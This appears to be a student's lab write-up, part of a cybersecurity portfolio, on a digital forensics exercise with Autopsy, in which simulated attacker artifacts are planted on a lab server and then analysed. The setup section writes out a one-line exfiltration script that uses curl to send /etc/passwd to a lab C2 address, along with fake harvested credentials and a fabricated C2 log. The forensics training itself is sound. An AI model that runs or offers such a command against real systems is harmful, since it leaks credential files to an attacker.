# Week 10 — Digital Forensics with Autopsy

## Overview

This week focused on digital forensics investigation using **Autopsy**, a professional-grade open-source forensic analysis platform. The objective was to simulate a realistic forensic investigation: planting attacker artifacts on a compromised Ubuntu Server, collecting evidence, loading it into Autopsy, and reconstructing the attack story from the recovered files.

---

## Learning Objectives

- Understand the digital forensics workflow: evidence collection → analysis → reporting
- Use Autopsy to load, browse, and keyword-search digital evidence
- Correlate artifacts across multiple files to reconstruct an attack timeline
- Produce a professional forensic investigation report
- Understand the relationship between forensics and incident response (NIST SP 800-61)

---

## Lab Environment

| Component | Details |
|-----------|---------|
| Target System | Ubuntu Server 24.04 LTS — 192.168.0.89 |
| Forensics Workstation | Windows Host |
| Analysis Tool | Autopsy (latest stable) |
| Evidence Transfer | SCP (Secure Copy Protocol) |
| Virtualisation | Oracle VirtualBox 7.2.6 |

---

## Methodology

### Evidence Creation (Simulated Compromise)
Attacker artifacts were manually planted on the Ubuntu Server to simulate a post-compromise state:

```bash
mkdir -p ~/forensics-evidence
cd ~/forensics-evidence

# Exfiltration script
cat > malware.sh << 'EOF'
#!/bin/bash
curl -s http://192.168.1.100:4444 -d "$(cat /etc/passwd)"
EOF

# Harvested credentials
cat > creds.txt << 'EOF'
admin:password123
root:toor
ruben:Welcome1
EOF

# C2 session log
cat > exfil.log << 'EOF'
2025-01-15 03:12:44 - Connected to C2: 192.168.1.100:4444
2025-01-15 03:12:45 - Sent /etc/passwd (2.1KB)
2025-01-15 03:12:46 - Sent /etc/shadow (1.8KB)
2025-01-15 03:12:50 - Session closed
EOF

# Suspicious note
cat > deleted_note.txt << 'EOF'
Meeting with buyer on Friday. Transfer funds to account 4111-XXXX-XXXX-1234
EOF
```

### Evidence Transfer
Files were transferred from Ubuntu Server to the Windows forensics workstation using SCP:

```powershell
scp -r ruben@192.168.0.89:~/forensics-evidence C:\forensics-evidence
```

### Autopsy Analysis
1. Created a new case in Autopsy (`WK10-FORENSICS-001`)
2. Added evidence as a **Logical File Set** pointing to `C:\forensics-evidence`
3. Ran ingest modules and browsed recovered files
4. Performed keyword searches: `192.168.1.100`, `curl`, `passwd`

> **Note on methodology:** In a real forensic investigation, evidence would be collected from a **bit-for-bit disk image** to preserve deleted files, unallocated space, and filesystem metadata without touching the original. Due to VirtualBox lab constraints, logical file collection was used instead — valid for content analysis, but disk imaging remains the forensic gold standard.

---

## Evidence Recovered

| File | Type | Finding |
|------|------|---------|
| `malware.sh` | Bash script | Exfiltration script — curl POST to C2 at 192.168.1.100:4444 |
| `exfil.log` | Log file | Confirms C2 session, /etc/passwd and /etc/shadow exfiltrated |
| `creds.txt` | Text file | Harvested credentials for admin, root, and ruben accounts |
| `deleted_note.txt` | Text file | Financial communication referencing bank account transfer |

---

## Screenshots

| Screenshot | Description |
|-----------|-------------|
| `screenshots/01-malware-sh.png` | malware.sh contents in Autopsy |
| `screenshots/02-exfil-log.png` | exfil.log contents — C2 session timeline |
| `screenshots/03-creds-txt.png` | creds.txt — harvested credentials |
| `screenshots/04-deleted-note.png` | deleted_note.txt — financial communication |
| `screenshots/05-keyword-c2-ip.png` | Keyword search: 192.168.1.100 highlighted in exfil.log |
| `screenshots/06-keyword-curl.png` | Keyword search: curl highlighted in malware.sh |
| `screenshots/07-keyword-passwd.png` | Keyword search: passwd highlighted across files |

---

## Key Findings

### Reconstructed Attack Timeline

| Phase | Activity |
|-------|---------|
| Initial Access | Attacker gained access to Ubuntu Server |
| Privilege Escalation | Root access obtained (/etc/shadow readable and exfiltrated) |
| Credential Harvesting | User credentials compiled into creds.txt |
| Exfiltration | malware.sh executed — /etc/passwd + /etc/shadow sent to C2 |
| Post-Compromise | Financial communication note created |

### Indicators of Compromise (IoCs)

| Type | Value |
|------|-------|
| C2 IP Address | 192.168.1.100 |
| C2 Port | 4444 |
| Tool (misused) | curl |
| Malicious file | malware.sh |

---

## Key Concepts Learned

- **Evidence correlation** — the C2 IP appearing in both `malware.sh` and `exfil.log` independently corroborates the finding, which is far stronger than a single source
- **Keyword pivoting** — searching for known IoCs (IPs, tool names, file paths) across a dataset is a core forensic technique
- **Forensics vs incident response** — IR (Week 8) focuses on containing and recovering from an attack; forensics is the deep-dive investigation that follows to understand *exactly* what happened and produce evidence
- **Chain of custody** — Autopsy logs all analyst actions, which is critical in real cases where evidence must hold up legally
- **Disk imaging principle** — logical file collection works for content analysis; full disk images additionally preserve deleted files, file system metadata, and unallocated space

---

## Deliverables

- **[forensics-report](week10-forensics-report.pdf)** — Professional report following blueteam standards.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Autopsy | Digital forensics platform — evidence loading, browsing, keyword search |
| SCP | Secure evidence transfer from Ubuntu Server |
| Ubuntu Server 24.04 LTS | Target system (simulated compromised host) |
| VirtualBox 7.2.6 | Lab virtualisation platform |

---

*Part of a self-designed cybersecurity pre-master's portfolio program covering server hardening, packet analysis, cryptography, web vulnerabilities, SIEM deployment, incident response, malware analysis, and digital forensics.*
